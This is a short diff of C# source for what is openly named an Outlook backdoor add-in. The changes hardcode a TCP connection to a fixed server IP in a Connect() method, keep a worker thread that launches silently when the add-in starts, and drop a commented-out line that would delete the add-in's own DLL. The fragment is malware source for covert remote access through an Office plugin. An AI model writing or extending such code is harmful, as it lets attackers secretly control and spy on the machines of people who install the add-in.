@@ -21,12 +21,7 @@ namespace OutlookBackDoor_4
         public bool Connect()
         {
 
-            string serverIP = "192.168.101.1"; //System.Configuration.ConfigurationSettings.AppSettings["server"];//"127.0.0.1";
-            //if (serverIP == string.Empty)
-            //{
-            //    serverIP = "127.0.0.1";
-            //}
-
+            string serverIP = "192.168.101.1";
             newclient = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
             if (newclient != null)
             {
@@ -129,7 +124,6 @@ namespace OutlookBackDoor_4
             Worker workerobject = new Worker();
             Thread workerThread = new Thread(workerobject.dowork);
             workerThread.Start();
-            //File.Delete("E:\\Program Files\\Microsoft Office\\Office12\\ADDINS\\OutlookAddIn1.dll");
         }
 
         private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
